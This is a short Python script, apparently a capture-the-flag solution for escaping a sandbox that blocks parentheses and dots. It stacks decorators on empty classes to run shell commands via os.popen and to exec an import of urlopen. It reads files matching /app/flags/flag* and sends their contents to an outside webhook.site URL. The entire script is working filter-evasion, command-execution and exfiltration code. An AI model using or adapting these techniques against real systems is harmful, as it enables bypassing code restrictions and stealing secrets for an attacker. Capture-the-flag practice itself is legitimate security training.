from os import popen

cmd = lambda a: "ls /app"
func1 = lambda f: [x[:-1] for x in f][2][-3]

@func1
@popen
@cmd
class dots:pass

dot = dots
importurlib = "from urllib" + dot + "request import urlopen"
importlib = lambda f: importurlib

@exec
@importlib
class importlibf:pass

url = "https://webhook" + dot + "site/5399367e-260a-4a67-bfbc-575f6aaeb333/?flag="

cmd2 = lambda a: "cat /app/flags/flag*"
func2 = lambda f: [x[:-1] for x in f][0]

@func2
@popen
@cmd2
class flag:pass

flagurl = url + flag
urls = lambda f: flagurl

@urlopen
@urls
class requestf:pass